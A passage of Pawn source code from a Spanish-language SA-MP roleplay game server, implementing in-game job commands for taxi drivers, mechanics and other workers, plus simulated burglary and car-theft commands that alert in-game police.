			SendClientMessage(playerid, Verde, "Sube a una cosechadora para comenzar a trabajar.");
			SendClientMessage(playerid, Verde, "Utiliza '/Trabajar' de nuevo para dejar de trabajar.");
			return 1;
		}
		if(empleo == 5) //Fumigador aéreo
		{
		    if(PlayerInfo[playerid][pEsperaTrabajar] > 0)
		    {
		        format(string, sizeof(string), "* Estás cansado de trabajar. Vuelve en %d minutos.", PlayerInfo[playerid][pEsperaTrabajar]);
		        SendClientMessage(playerid, Rojo, string);
				return 1;
		    }
		    if(!IsPlayerInRangeOfPoint(playerid, 10.0, Jobs[job][Jx], Jobs[job][Jy], Jobs[job][Jz])){SendClientMessage(playerid, Rojo, "* No estás en tu puesto de trabajo."); return 1;}
		    SetPlayerSkin(playerid, 161);
			Trabajando[playerid] = 1;
			SendClientMessage(playerid, Verde, "Sube al avión para comenzar a trabajar.");
			SendClientMessage(playerid, Verde, "Utiliza '/Trabajar' de nuevo para dejar de trabajar.");
			return 1;
		}
		if(empleo == 6) //Taxista
		{
		    tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, Naranja, "* /Trabajar [Tarifa (5-20)]");
				return 1;
			}
			new n = strval(tmp);
			if(n < 5 || n > 20){SendClientMessage(playerid, Rojo, "* La tarifa debe estar entre 5$ y 20$."); return 1;}
			Trabajando[playerid] = 1;
			Tarifa[playerid] = n;
			format(string, sizeof(string), "El taxista %s está de servicio. Tarifa: %d$.", GetPlayerNameRP(playerid), n);
			SendAnuncio(Verde, string);
			SendClientMessage(playerid, Verde, "Ahora estás de servicio, utiliza '/Ayuda Trabajo' para mirar los comandos de tu trabajo.");
			SendClientMessage(playerid, Verde, "Utiliza '/Trabajar' de nuevo para dejar de trabajar.");
			return 1;
		}
		if(empleo == 7) //Mecánico
		{
		    SetPlayerSkin(playerid, 50);
		    Trabajando[playerid] = 1;
			SendClientMessage(playerid, Verde, "Ahora estás de servicio, utiliza '/Ayuda Trabajo' para mirar los comandos de tu trabajo.");
			SendClientMessage(playerid, Verde, "Utiliza '/Trabajar' de nuevo para dejar de trabajar.");
			return 1;
		}
		if(empleo == 9) //Pescador
		{
		    if(PlayerInfo[playerid][pEsperaTrabajar] > 0)
		    {
		        format(string, sizeof(string), "* Estás cansado de trabajar. Vuelve en %d minutos.", PlayerInfo[playerid][pEsperaTrabajar]);
		        SendClientMessage(playerid, Rojo, string);
				return 1;
		    }
		    Trabajando[playerid] = 1;
			SendClientMessage(playerid, Verde, "Sube a un barco de pesca para comenzar a pescar.");
			SendClientMessage(playerid, Verde, "Utiliza '/Trabajar' de nuevo para dejar de trabajar.");
			return 1;
		}
	}
	else
	{
	    new empleo = PlayerInfo[playerid][pTrabajo];
	    if(empleo == 1) //Pizzero
		{
			SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
			DisablePlayerCheckpoint(playerid);
			Trabajando[playerid] = 0;
			PizzaRepartida[playerid] = 0;
			SendClientMessage(playerid, Verde, "* Has dejado de trabajar. A tu jefe no le gustan los holgazanes, así que no cobras.");
			if(IsAPizzaBike(GetPlayerVehicleID(playerid)))RemovePlayerFromVehicle(playerid);
			return 1;
		}
		if(empleo == 2) //Barrendero
		{
			SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
			DisablePlayerCheckpoint(playerid);
			Trabajando[playerid] = 0;
			CalleBarrida[playerid] = 0;
			SendClientMessage(playerid, Verde, "* Has dejado de trabajar. A tu jefe no le gustan los holgazanes, así que no cobras.");
			if(IsASweeper(GetPlayerVehicleID(playerid)))RemovePlayerFromVehicle(playerid);
			return 1;
		}
		if(empleo == 3) //Securicar
		{
			SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
			DisablePlayerCheckpoint(playerid);
			Trabajando[playerid] = 0;
			CajeroRepuesto[playerid] = 0;
			SendClientMessage(playerid, Verde, "* Has dejado de trabajar. A tu jefe no le gustan los holgazanes, así que no cobras.");
			if(IsASecuricar(GetPlayerVehicleID(playerid)))RemovePlayerFromVehicle(playerid);
			return 1;
		}
		if(empleo == 4) //Cosechador
		{
		    SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
			DisablePlayerCheckpoint(playerid);
			Trabajando[playerid] = 0;
			Cosechado[playerid] = 0;
			SendClientMessage(playerid, Verde, "* Has dejado de trabajar. A tu jefe no le gustan los holgazanes, así que no cobras.");
			if(IsACombine(GetPlayerVehicleID(playerid)))RemovePlayerFromVehicle(playerid);
			return 1;
		}
		if(empleo == 5) //Fumigador aéreo
		{
		    SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
			DisablePlayerRaceCheckpoint(playerid);
			DisablePlayerCheckpoint(playerid);
			Trabajando[playerid] = 0;
			Fumigado[playerid] = 0;
			SendClientMessage(playerid, Verde, "* Has dejado de trabajar. A tu jefe no le gustan los holgazanes, así que no cobras.");
			if(IsACropduster(GetPlayerVehicleID(playerid)))RemovePlayerFromVehicle(playerid);
			return 1;
		}
		if(empleo == 6) //Taxista
		{
			Trabajando[playerid] = 0;
			SendClientMessage(playerid, Verde, "* Ya no estás de servicio como taxista.");
			return 1;
		}
		if(empleo == 7) //Mecánico
		{
		    SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
			Trabajando[playerid] = 0;
			SendClientMessage(playerid, Verde, "* Ya no estás de servicio como mecánico.");
			return 1;
		}
		if(empleo == 9) //Pescador
		{
		    DisablePlayerCheckpoint(playerid);
			Trabajando[playerid] = 0;
			PescaRecogida[playerid] = 0;
			SendClientMessage(playerid, Verde, "* Has dejado de trabajar. A tu jefe no le gustan los holgazanes, así que no cobras.");
			if(IsABarcoPesca(GetPlayerVehicleID(playerid)))RemovePlayerFromVehicle(playerid);
			return 1;
		}
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

/*if(strcmp(cmd, "/entregapizza", true) == 0) //Acepta entregar una pizza
{
    if(PlayerInfo[playerid][pTrabajo] != 1){SendClientMessage(playerid, Rojo, "* No eres pizzero."); return 1;}
	if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás trabajando."); return 1;}
	new pidepizza;
	for(new i=0; i<MAX_PLAYERS; i++)
	{
	    if(SolicitaPizza[i] > 0){pidepizza = i; break;}
	}
	if(pidepizza){SendClientMessage(playerid, Rojo, "* No hay pedidos de pizza actualmente."); return 1;}
	format(string, sizeof(string), "Has aceptado el pedido de %s. Ve a la posición del mapa para entregársela.", GetPlayerNameRP(pidepizza));
	SendClientMessage(playerid, Amarillo, string);
	new Float:mX, Float:mY, Float:mZ;
	GetPlayerPos(pidepizza, mX, mY, mZ);
	SetPlayerCheckpoint(playerid, mX, mY, mZ, 3.0);
	format(string, sizeof(string), "Weel Stacked Pizza Co.: El pizzero %s ha aceptado el pedido. No se mueva de su posición.", GetPlayerNameRP(playerid));
	SendClientMessage(playerid, Amarillo, string);
	SolicitaPizza[pidepizza] = 0;
	return 1;
}*/

//---------------------------------------------------------------------------------------------------------------

/*if(strcmp(cmd, "/venderpizza", true) == 0) //Vender pizza a alguien
{
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /VenderPizza [ID]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if((playerid2 == INVALID_PLAYER_ID) || !IsPlayerConnected(playerid2))
	{
		SendClientMessage(playerid, Rojo, "* ID inválida.");
		return 1;
	}
	if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	format(string, sizeof(string), "%s te ha ofrecido una pizza por 20$. Utiliza '/Aceptar Pizza' para aceptarla.", GetPlayerNameRP(playerid));
	SendClientMessage(playerid2, Amarillo, string);
    return 1;
}*/

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/taxi", true) == 0) //Ofrecer transporte a alguien
{
	if(PlayerInfo[playerid][pTrabajo] != 6){SendClientMessage(playerid, Rojo, "* No eres taxista."); return 1;}
	if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás de servicio como taxista."); return 1;}
	if(!IsATaxi(GetPlayerVehicleID(playerid))){SendClientMessage(playerid, Rojo, "* No estás en un taxi."); return 1;}
	if(TaxiPasajero[playerid] != NOEXISTE){SendClientMessage(playerid, Rojo, "* Ya hay alguien pagándote por ir en taxi."); return 1;}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Taxi [ID]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(playerid2 == playerid){SendClientMessage(playerid, Rojo, "* No te puedes ofrecer transporte a tí mismo."); return 1;}
    if((playerid2 == INVALID_PLAYER_ID) || !IsPlayerConnected(playerid2))
	{
		SendClientMessage(playerid, Rojo, "* ID inválida.");
		return 1;
	}
	if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(playerid2)){SendClientMessage(playerid, Rojo, "* Esa persona no está en tu taxi."); return 1;}
	TaxiPasajero[playerid] = playerid2;
	TaxiConductor[playerid2] = playerid;
	format(string, sizeof(string), "Estás llevando a %s en tu taxi por %d$ cada medio minuto.", GetPlayerNameRP(playerid2), Tarifa[playerid]);
	SendClientMessage(playerid, Amarillo, string);
	SendClientMessage(playerid, Amarillo, "Ve al destino que te ordenó.");
	format(string, sizeof(string), "%s te está llevando en su taxi por %d$ cada medio minuto.", GetPlayerNameRP(playerid), Tarifa[playerid]);
	SendClientMessage(playerid2, Amarillo, string);
	SendClientMessage(playerid2, Amarillo, "Baja del vehículo cuando llegues a tu destino.");
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/llevartaxi", true) == 0) //Acepta el pedido de taxi de alguien
{
    if(PlayerInfo[playerid][pTrabajo] != 6){SendClientMessage(playerid, Rojo, "* No eres taxista."); return 1;}
	if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás trabajando."); return 1;}
	if(!IsATaxi(GetPlayerVehicleID(playerid))){SendClientMessage(playerid, Rojo, "* No estás en un taxi."); return 1;}
	new pidetaxi = NOEXISTE;
	for(new i=0; i<MAX_PLAYERS; i++)
	{
	    if(SolicitaTaxi[i] > 0){pidetaxi = i; break;}
	}
	if(pidetaxi == NOEXISTE){SendClientMessage(playerid, Rojo, "* Nadie solicita un taxi actualmente."); return 1;}
	format(string, sizeof(string), "Has aceptado la solicitud de taxi de %s. Ve a su posición.", GetPlayerNameRP(pidetaxi));
	SendClientMessage(playerid, Amarillo, string);
	new Float:mX, Float:mY, Float:mZ;
	GetPlayerPos(pidetaxi, mX, mY, mZ);
	SetPlayerCheckpoint(playerid, mX, mY, mZ, 3.0);
	format(string, sizeof(string), "Agencia de transporte: El taxista %s ha aceptado tu solicitud. No se mueva de su posición.", GetPlayerNameRP(playerid));
	SendClientMessage(pidetaxi, Amarillo, string);
	SolicitaTaxi[pidetaxi] = 0;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/reparar", true) == 0) //Ofrecer reparación a alguien
{
	if(PlayerInfo[playerid][pTrabajo] != 7){SendClientMessage(playerid, Rojo, "* No eres mecánico."); return 1;}
	if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás de servicio como mecánico."); return 1;}
	if(!GetPlayerTaller(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un taller."); return 1;}
	if(GetPlayerTaller(playerid) != 1 && PlayerInfo[playerid][pTaller] != GetPlayerTaller(playerid)){SendClientMessage(playerid, Rojo, "* No trabajas en este taller."); return 1;}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Reparar [ID] [Motor/Carroceria/Ruedas] [Precio]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(playerid2 == playerid){SendClientMessage(playerid, Rojo, "* No te puedes ofrecer reparación a tí mismo."); return 1;}
    if((playerid2 == INVALID_PLAYER_ID) || !IsPlayerConnected(playerid2)){SendClientMessage(playerid, Rojo, "* ID inválida.");return 1;}
	if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	if(!IsPlayerInAnyVehicle(playerid2)){SendClientMessage(playerid, Rojo, "* Esa persona no está en ningún vehículo."); return 1;}
	if(SiendoReparado[playerid2] != 0){SendClientMessage(playerid, Rojo, "* Ya están reparando el vehículo de esta persona, espera a que terminen."); return 1;}
	new coche = GetPlayerVehicleID(playerid2);
	new opcion[128];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Reparar [ID] [Motor/Carroceria/Ruedas] [Precio]");
		return 1;
	}
	if(strcmp(opcion,"motor",true) == 0)
	{
	    if(VehCapo[coche] != 1){SendClientMessage(playerid, Rojo, "* El vehículo debe tener abierto el capó."); return 1;}
	    new Float:cvida;
	    GetVehicleHealth(coche, cvida);
		if(cvida == 1000){SendClientMessage(playerid, Rojo, "* El motor de este vehículo está en perfecto estado."); return 1;}
		tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Reparar [ID] [Motor/Carroceria/Ruedas] [Precio]");
	        return 1;
	    }
	    new precio = strval(tmp);
	    if(precio < 30 || precio > 200){SendClientMessage(playerid, Rojo, "* El precio debe estar entre 30$ y 200$."); return 1;}
	    format(string, sizeof(string), "Has ofrecido a %s repararle el motor por %d$. Espera una respuesta.", GetPlayerNameRP(playerid2), precio);
	    SendClientMessage(playerid, Amarillo, string);
	    format(string, sizeof(string), "%s te ha ofrecido repararte el motor por %d$. Utiliza '/Aceptar Reparacion' para aceptarlo.", GetPlayerNameRP(playerid), precio);
	    SendClientMessage(playerid2, Amarillo, string);
		ReparacionTipo[playerid2] = 1;
		ReparacionMeca[playerid2] = playerid;
		ReparacionPrecio[playerid2] = precio;
	    return 1;
	}
	if(strcmp(opcion,"carroceria",true) == 0)
	{
	    new panels,doors,lights,tires;
		GetVehicleDamageStatus(coche,panels,doors,lights,tires);
		if(panels == 0 && doors == 0 && lights == 0){SendClientMessage(playerid, Rojo, "* La carrocería de este vehículo está en perfecto estado."); return 1;}
		tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Reparar [ID] [Motor/Carroceria/Ruedas] [Precio]");
	        return 1;
	    }
	    new precio = strval(tmp);
	    if(precio < 30 || precio > 200){SendClientMessage(playerid, Rojo, "* El precio debe estar entre 30$ y 200$."); return 1;}
	    format(string, sizeof(string), "Has ofrecido a %s repararle la carrocería por %d$. Espera una respuesta.", GetPlayerNameRP(playerid2), precio);
	    SendClientMessage(playerid, Amarillo, string);
	    format(string, sizeof(string), "%s te ha ofrecido repararte la carrocería por %d$. Utiliza '/Aceptar Reparacion' para aceptarlo.", GetPlayerNameRP(playerid), precio);
	    SendClientMessage(playerid2, Amarillo, string);
		ReparacionTipo[playerid2] = 2;
		ReparacionMeca[playerid2] = playerid;
		ReparacionPrecio[playerid2] = precio;
		return 1;
	}
	if(strcmp(opcion,"ruedas",true) == 0)
	{
	    new panels,doors,lights,tires;
		GetVehicleDamageStatus(coche,panels,doors,lights,tires);
		if(tires == 0){SendClientMessage(playerid, Rojo, "* Las ruedas de este vehículo están en perfecto estado."); return 1;}
		tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, Naranja, "* /Reparar [ID] [Motor/Carroceria/Ruedas] [Precio]");
	        return 1;
	    }
	    new precio = strval(tmp);
	    if(precio < 30 || precio > 200){SendClientMessage(playerid, Rojo, "* El precio debe estar entre 30$ y 200$."); return 1;}
	    format(string, sizeof(string), "Has ofrecido a %s repararle las ruedas por %d$. Espera una respuesta.", GetPlayerNameRP(playerid2), precio);
	    SendClientMessage(playerid, Amarillo, string);
	    format(string, sizeof(string), "%s te ha ofrecido repararte las ruedas por %d$. Utiliza '/Aceptar Reparacion' para aceptarlo.", GetPlayerNameRP(playerid), precio);
	    SendClientMessage(playerid2, Amarillo, string);
		ReparacionTipo[playerid2] = 3;
		ReparacionMeca[playerid2] = playerid;
		ReparacionPrecio[playerid2] = precio;
		return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/repintar", true) == 0) //Ofrecer repintar coche a alguien
{
    if(PlayerInfo[playerid][pTrabajo] != 7){SendClientMessage(playerid, Rojo, "* No eres mecánico."); return 1;}
	if(Trabajando[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás de servicio como mecánico."); return 1;}
	if(PlayerInfo[playerid][pHabMec] < 30){SendClientMessage(playerid, Rojo, "* Necesitas nivel 2 de mecánico para usar este comando."); return 1;}
	if(!GetPlayerTaller(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un taller."); return 1;}
	if(GetPlayerTaller(playerid) != 1 && PlayerInfo[playerid][pTaller] != GetPlayerTaller(playerid)){SendClientMessage(playerid, Rojo, "* No trabajas en este taller."); return 1;}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Repintar [ID] [Color1] [Color2] [Precio]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(playerid2 == playerid){SendClientMessage(playerid, Rojo, "* No te puedes ofrecer un repintado a tí mismo."); return 1;}
    if((playerid2 == INVALID_PLAYER_ID) || !IsPlayerConnected(playerid2))
	{
		SendClientMessage(playerid, Rojo, "* ID inválida.");
		return 1;
	}
	if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	if(!IsPlayerInAnyVehicle(playerid2)){SendClientMessage(playerid, Rojo, "* Esa persona no está en ningún vehículo."); return 1;}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Repintar [ID] [Color1] [Color2] [Precio]");
        return 1;
    }
    new color1 = strval(tmp);
    tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Repintar [ID] [Color1] [Color2] [Precio]");
        return 1;
    }
    new color2 = strval(tmp);
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Repintar [ID] [Color1] [Color2] [Precio]");
        return 1;
    }
    new precio = strval(tmp);
    if(precio < 200 || precio > 700){SendClientMessage(playerid, Rojo, "* El precio debe estar entre 200$ y 700$."); return 1;}
    format(string, sizeof(string), "Has ofrecido a %s repintarle el vehículo (colores %d %d) por %d$. Espera una respuesta.", GetPlayerNameRP(playerid2), color1, color2, precio);
    SendClientMessage(playerid, Amarillo, string);
    format(string, sizeof(string), "%s te ha ofrecido repintarte el vehículo (colores %d %d) por %d$. Utiliza '/Aceptar Repintado'.", GetPlayerNameRP(playerid), color1, color2, precio);
    SendClientMessage(playerid2, Amarillo, string);
	RepintadoColor1[playerid2] = color1;
	RepintadoColor2[playerid2] = color2;
	RepintadoMeca[playerid2] = playerid;
	RepintadoPrecio[playerid2] = precio;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/forzar", true) == 0)
{
    if(PlayerInfo[playerid][pTrabajo] != 8){SendClientMessage(playerid, Rojo, "* No eres ladrón."); return 1;}
    if(PlayerInfo[playerid][pManoDer] != 15 && PlayerInfo[playerid][pManoDer] != 15){SendClientMessage(playerid, Rojo, "* Necesitas una palanca para forzar una puerta."); return 1;}
    if(PlayerInfo[playerid][pHabLad] < 30){SendClientMessage(playerid, Rojo, "* Necesitas nivel 2 de ladrón para usar este comando."); return 1;}
    if(PuertaForzada[playerid] > 0)
	{
	    format(string, sizeof(string), "* Espera %d minutos antes de intentar forzar otra puerta.", PuertaForzada[playerid]);
		SendClientMessage(playerid, Rojo, string);
		return 1;
	}
    if(!GetPlayerFueraPuertaCasa(playerid) && !GetPlayerFueraPuertaNego(playerid)){SendClientMessage(playerid, Rojo, "* No estás en la puerta de una casa o local."); return 1;}
    if(GetPlayerFueraPuertaCasa(playerid))
    {
        new casa = GetPlayerFueraPuertaCasa(playerid);
        if(HouseInfo[casa][hCerrada] == 0){SendClientMessage(playerid, Rojo, "* La puerta de esta casa ya está abierta."); return 1;}
        new rand;
	    rand = random(10);
	    if(rand > 3+(PlayerInfo[playerid][pHabLad]/30))
		{
			format(string, sizeof(string), "* %s intenta forzar una puerta con una palanca pero no lo logra.", GetPlayerNameRP(playerid));
		    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		    PuertaForzada[playerid] = 2;
		    PlayerPlaySound(playerid, 1009, 0.0, 0.0, 0.0);
			return 1;
		}
		format(string, sizeof(string), "* %s fuerza una puerta con su palanca.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
	    PuertaForzada[playerid] = 2;
	    ProxDetector(30.0, playerid, "* Se oye el sonido de una puerta resquebrajándose.", Verde,Verde,Verde,Verde,Verde);
	    PlayerPlaySound(playerid, 1009, 0.0, 0.0, 0.0);
	    HouseInfo[casa][hCerrada] = 0;
	    UpdateHouseLabel(casa);
	    return 1;
    }
    else if(GetPlayerFueraPuertaNego(playerid))
    {
        new nego = GetPlayerFueraPuertaNego(playerid);
        if(NegoInfo[nego][nCerrado] == 0){SendClientMessage(playerid, Rojo, "* La puerta de este local ya está abierta."); return 1;}
        new rand;
	    rand = random(10);
	    if(rand > 3+(PlayerInfo[playerid][pHabLad]/30))
		{
			format(string, sizeof(string), "* %s intenta forzar una puerta con una palanca pero no lo logra.", GetPlayerNameRP(playerid));
		    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		    PuertaForzada[playerid] = 2;
		    PlayerPlaySound(playerid, 1009, 0.0, 0.0, 0.0);
			return 1;
		}
		format(string, sizeof(string), "* %s fuerza una puerta con su palanca.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
	    PuertaForzada[playerid] = 2;
	    ProxDetector(30.0, playerid, "* Se oye el sonido de una puerta resquebrajándose.", Verde,Verde,Verde,Verde,Verde);
	    PlayerPlaySound(playerid, 1009, 0.0, 0.0, 0.0);
	    NegoInfo[nego][nCerrado] = 0;
	    UpdateNegocioLabel(nego);
	    return 1;
    }
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/robar", true) == 0) //Robar en casas o locales
{
    if(PlayerInfo[playerid][pTrabajo] != 8){SendClientMessage(playerid, Rojo, "* No eres ladrón."); return 1;}
    if(!GetPlayerDentroCasa(playerid) && !GetPlayerDentroNego(playerid)){SendClientMessage(playerid, Rojo, "* No estás en una casa o un local."); return 1;}
    if(Robando[playerid] > 0){SendClientMessage(playerid, Rojo, "* Ya estás robando."); return 1;}
    if(PlayerInfo[playerid][pTiempoRobo] > 0)
    {
        format(string, sizeof(string), "* Debes esperar %d minutos para usar este comando.", PlayerInfo[playerid][pTiempoRobo]);
        SendClientMessage(playerid, Rojo, string);
        return 1;
    }
    new policonectado;
    for(new x=0; x<MAX_PLAYERS; x++)
    {
        if(IsPlayerConnected(x) && x != INVALID_PLAYER_ID && PlayerInfo[x][pFaccion] == 1 && PlayerInfo[x][pServicioPD] > 0){policonectado = 1; break;}
    }
    if(policonectado == 0){SendClientMessage(playerid, Rojo, "* Debe haber al menos un policía de servicio conectado para poder robar."); return 1;}
	if(GetPlayerDentroCasa(playerid)) //Es una casa
	{
	    new casa = GetPlayerDentroCasa(playerid);
	    if(PlayerInfo[playerid][pCasa] == casa){SendClientMessage(playerid, Rojo, "* No puedes robar en tu propia casa."); return 1;}
	    if(IsPlayerInRangeOfPoint(playerid, 7.0, HouseInfo[casa][hSalidaX], HouseInfo[casa][hSalidaY], HouseInfo[casa][hSalidaZ])){SendClientMessage(playerid, Rojo, "* Debes estar más alejado de la puerta para robar."); return 1;}
		format(string, sizeof(string), "* %s comienza a buscar dinero y objetos de valor por la casa.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
	    Robando[playerid] = 1;
	    RoboTimer[playerid] = SetTimerEx("RobarF", 15000, false, "i, d", playerid, 2);
	    TogglePlayerControllable(playerid, 0);
	    ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,1,1,1,0,0,1);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && i != INVALID_PLAYER_ID)
			{
				if(PlayerInfo[i][pFaccion] == 1 && PlayerInfo[i][pServicioPD] > 0)
				{
					SetPlayerCheckpoint(i, HouseInfo[casa][hEntradaX], HouseInfo[casa][hEntradaY], HouseInfo[casa][hEntradaZ], 4.0);
					format(string, sizeof(string), "[Radio] Central: Reportan un robo doméstico en la casa {FF0000}%s.", HouseInfo[casa][hBarrio]);
					SendClientMessage(i, AguamarinaOscuro, string);
					format(string, sizeof(string), "[Radio] Central: Describen al sospechoso como... (({FF0000}%s{02b1af})).", GetPlayerNameRP(playerid));
					SendClientMessage(i, AguamarinaOscuro, string);
				}
			}
		}
	    return 1;
	}
	if(GetPlayerDentroNego(playerid)) //Es un negocio
	{
	    new nego = GetPlayerDentroNego(playerid);
	    if(PlayerInfo[playerid][pNegocio] == nego){SendClientMessage(playerid, Rojo, "* No puedes robar en tu propia negocio."); return 1;}
	    if(IsPlayerInRangeOfPoint(playerid, 7.0, NegoInfo[nego][nSalidaX], NegoInfo[nego][nSalidaY], NegoInfo[nego][nSalidaZ])){SendClientMessage(playerid, Rojo, "* Debes estar más alejado de la puerta para robar."); return 1;}
	    if(NegoInfo[nego][nTipo] == 13 || NegoInfo[nego][nTipo] == 14){SendClientMessage(playerid, Rojo, "* No puedes robar en oficinas o almacenes."); return 1;}
		format(string, sizeof(string), "* %s comienza a forzar la caja fuerte para intentar llevarse el máximo dinero posible.", GetPlayerNameRP(playerid));
	    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
	    Robando[playerid] = 1;
	    RoboTimer[playerid] = SetTimerEx("RobarF", 20000, false, "i, d", playerid, 2);
	    TogglePlayerControllable(playerid, 0);
	    ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,1,1,1,0,0,1);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && i != INVALID_PLAYER_ID)
			{
				if(PlayerInfo[i][pFaccion] == 1 && PlayerInfo[i][pServicioPD] > 0)
				{
					SetPlayerCheckpoint(i, NegoInfo[nego][nEntradaX], NegoInfo[nego][nEntradaY], NegoInfo[nego][nEntradaZ], 4.0);
					format(string, sizeof(string), "[Radio] Central: Reportan un robo en el local {FF0000}%s.", NegoInfo[nego][nNombre]);
					SendClientMessage(i, AguamarinaOscuro, string);
					format(string, sizeof(string), "[Radio] Central: Describen al sospechoso como... (({FF0000}%s{02b1af})).", GetPlayerNameRP(playerid));
					SendClientMessage(i, AguamarinaOscuro, string);
				}
			}
		}
	    return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/puentear", true) == 0) //Robar un vehículo
{
    if(PlayerInfo[playerid][pTrabajo] != 8){SendClientMessage(playerid, Rojo, "* No eres ladrón."); return 1;}
    if(PlayerInfo[playerid][pHabLad] < 60){SendClientMessage(playerid, Rojo, "* Necesitas nivel 3 de ladrón para usar este comando."); return 1;}
    if(PuenteHecho[playerid] > 0)
    {
        format(string, sizeof(string), "* Debes esperar %d minutos para volver a usar este comando.", PuenteHecho[playerid]);
        SendClientMessage(playerid, Rojo, string);
        return 1;
    }
	if(!IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid, Rojo, "* No estás montado en un vehículo como conductor."); return 1;}
	new carid = GetPlayerVehicleID(playerid);
	if(Puenteando[playerid] > 0){SendClientMessage(playerid, Rojo, "* Ya estás haciendo un puente a un vehículo."); return 1;}
	if(carid <= MAX_VEHPUBLICO){SendClientMessage(playerid, Rojo, "* No puedes robar un vehículo de facción o trabajo."); return 1;}
	if(PlayerInfo[playerid][pManoDer] != 74 && PlayerInfo[playerid][pManoIzq] != 74){SendClientMessage(playerid, Rojo, "* Necesitas un destornillador para hacer el puente."); return 1;}
	
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
    
    if(engine == 1){SendClientMessage(playerid, Rojo, "* Este vehículo ya tiene el motor encendido."); return 1;}
    
	SetTimerEx("AlarmaCoche", 25000, false, "d", carid);
    SetVehicleParamsEx(carid,engine,lights,1,doors,bonnet,boot,objective);
    
    PuenteTimer[playerid] = SetTimerEx("PuentearF", 15000, false, "i, d", playerid, carid);
    format(string, sizeof(string), "* %s comienza a hacerle un puente a un vehículo.", GetPlayerNameRP(playerid));
	ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
	
	TogglePlayerControllable(playerid, 0);
	Puenteando[playerid] = 1;
	new Float:pX, Float:pY, Float:pZ;
	GetVehiclePos(carid, pX, pY, pZ);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && i != INVALID_PLAYER_ID)
		{
			if(PlayerInfo[i][pFaccion] == 1 && PlayerInfo[i][pServicioPD] > 0)
			{
				SetPlayerCheckpoint(i, pX, pY, pZ, 4.0);
				format(string, sizeof(string), "[Radio] Central: Reportan un robo de vehículo. Modelo: {FF0000}%s {02b1af}Matrícula: {FF0000}LS-%d.", CarInfo[carid][cNombreModelo], CarInfo[carid][cLlave]);
				SendClientMessage(i, AguamarinaOscuro, string);
